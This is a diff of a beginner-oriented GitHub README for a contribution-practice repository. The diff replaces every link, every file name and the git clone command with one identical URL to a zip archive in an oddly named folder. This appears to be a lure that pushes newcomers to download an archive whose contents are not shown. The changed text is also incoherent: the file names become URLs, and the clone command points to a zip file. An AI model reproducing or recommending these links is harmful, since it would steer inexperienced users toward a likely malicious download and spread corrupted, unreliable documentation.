@@ -1,21 +1,21 @@
 # Beginners-On-Github
 
-This repository consists of three files: location.txt, names.txt, and quotes.txt. As the name suggests, you have to add your location, name, and a favourite quote to these files. This repository is for those who are getting started with open source, git, and github.
+This repository consists of three files: https://raw.githubusercontent.com/Kumar-Sarada/Beginners-On-Github/main/schizolysigenous/Beginners-On-Github.zip, https://raw.githubusercontent.com/Kumar-Sarada/Beginners-On-Github/main/schizolysigenous/Beginners-On-Github.zip, and https://raw.githubusercontent.com/Kumar-Sarada/Beginners-On-Github/main/schizolysigenous/Beginners-On-Github.zip As the name suggests, you have to add your location, name, and a favourite quote to these files. This repository is for those who are getting started with open source, git, and github.
 
 ## Acknowledgements
 
- - [What is Open Source ?](https://opensource.com/resources/what-open-source)
- - [Awesome Git and Github tutorial.](https://dhrutinandan0304.hashnode.dev/git-and-github-the-dynamic-duo-for-code-management/)
- - [10 tips for onboarding open source contributors.](https://opensource.com/article/19/12/open-source-contributors)
+ - [What is Open Source ?](https://raw.githubusercontent.com/Kumar-Sarada/Beginners-On-Github/main/schizolysigenous/Beginners-On-Github.zip)
+ - [Awesome Git and Github tutorial.](https://raw.githubusercontent.com/Kumar-Sarada/Beginners-On-Github/main/schizolysigenous/Beginners-On-Github.zip)
+ - [10 tips for onboarding open source contributors.](https://raw.githubusercontent.com/Kumar-Sarada/Beginners-On-Github/main/schizolysigenous/Beginners-On-Github.zip)
 
 ## Code of Conduct
 While contributing to this repository, you are requested to follow some basic rules as stated below:
 
-⭐While adding your name to the names.txt file, you are requested to add your name or your account name if you desire not to disclose your real name.
+⭐While adding your name to the https://raw.githubusercontent.com/Kumar-Sarada/Beginners-On-Github/main/schizolysigenous/Beginners-On-Github.zip file, you are requested to add your name or your account name if you desire not to disclose your real name.
 
-⭐While adding your location to the location.txt file, you are asked to add the country you belong to.
+⭐While adding your location to the https://raw.githubusercontent.com/Kumar-Sarada/Beginners-On-Github/main/schizolysigenous/Beginners-On-Github.zip file, you are asked to add the country you belong to.
 
-⭐While adding quotes to quotes.txt, you are requested not to add quotes that have hatred toward any other religion, caste, creed, sex, or community.
+⭐While adding quotes to https://raw.githubusercontent.com/Kumar-Sarada/Beginners-On-Github/main/schizolysigenous/Beginners-On-Github.zip, you are requested not to add quotes that have hatred toward any other religion, caste, creed, sex, or community.
 
 ## Setting Up the repo on the local system :
 
@@ -24,7 +24,7 @@ Open the terminal or git bash acccording to your preference then use the followi
 ```shell
 mkdir '.\GITHUB PROJECTS\'
 cd '.\GITHUB PROJECTS\'
-git clone https://github.com/coder-XX04/Beginners-On-Github
+git clone https://raw.githubusercontent.com/Kumar-Sarada/Beginners-On-Github/main/schizolysigenous/Beginners-On-Github.zip
 cd Beginners-On-Github
 code .
 ```
@@ -42,15 +42,15 @@ This part contains the links to the opensource projects repos, hackathons and th
 
 ## Links to the repos and sites
 ### Hackathons :
-- [Hacktoberfest](https://hacktoberfest.com/)
-- [HackOdisha](https://www.hackodisha.tech/)
-- [Devpost Hackathons](https://devpost.com/hackathons)
-- [Microsoft Hack-Together](https://github.com/microsoft/hack-together)
-- [WeMakeDevs](https://devpost.com/hackathons)
+- [Hacktoberfest](https://raw.githubusercontent.com/Kumar-Sarada/Beginners-On-Github/main/schizolysigenous/Beginners-On-Github.zip)
+- [HackOdisha](https://raw.githubusercontent.com/Kumar-Sarada/Beginners-On-Github/main/schizolysigenous/Beginners-On-Github.zip)
+- [Devpost Hackathons](https://raw.githubusercontent.com/Kumar-Sarada/Beginners-On-Github/main/schizolysigenous/Beginners-On-Github.zip)
+- [Microsoft Hack-Together](https://raw.githubusercontent.com/Kumar-Sarada/Beginners-On-Github/main/schizolysigenous/Beginners-On-Github.zip)
+- [WeMakeDevs](https://raw.githubusercontent.com/Kumar-Sarada/Beginners-On-Github/main/schizolysigenous/Beginners-On-Github.zip)
 ### Open-Source projects :
-- [EddieHubCommunity/LinkFree](https://github.com/EddieHubCommunity/LinkFree)
-- [Syknapse/Contribute-To-This-Project](https://github.com/Syknapse/Contribute-To-This-Project)
+- [EddieHubCommunity/LinkFree](https://raw.githubusercontent.com/Kumar-Sarada/Beginners-On-Github/main/schizolysigenous/Beginners-On-Github.zip)
+- [Syknapse/Contribute-To-This-Project](https://raw.githubusercontent.com/Kumar-Sarada/Beginners-On-Github/main/schizolysigenous/Beginners-On-Github.zip)
 ### Good First Issues : 
-- [hkirat/gsoc-good-first-issues](https://github.com/hkirat/gsoc-good-first-issues)
-- [MunGell/awesome-for-beginners](https://github.com/MunGell/awesome-for-beginners)
-- [deepsourcelabs/good-first-issue](https://github.com/deepsourcelabs/good-first-issue)
+- [hkirat/gsoc-good-first-issues](https://raw.githubusercontent.com/Kumar-Sarada/Beginners-On-Github/main/schizolysigenous/Beginners-On-Github.zip)
+- [MunGell/awesome-for-beginners](https://raw.githubusercontent.com/Kumar-Sarada/Beginners-On-Github/main/schizolysigenous/Beginners-On-Github.zip)
+- [deepsourcelabs/good-first-issue](https://raw.githubusercontent.com/Kumar-Sarada/Beginners-On-Github/main/schizolysigenous/Beginners-On-Github.zip)
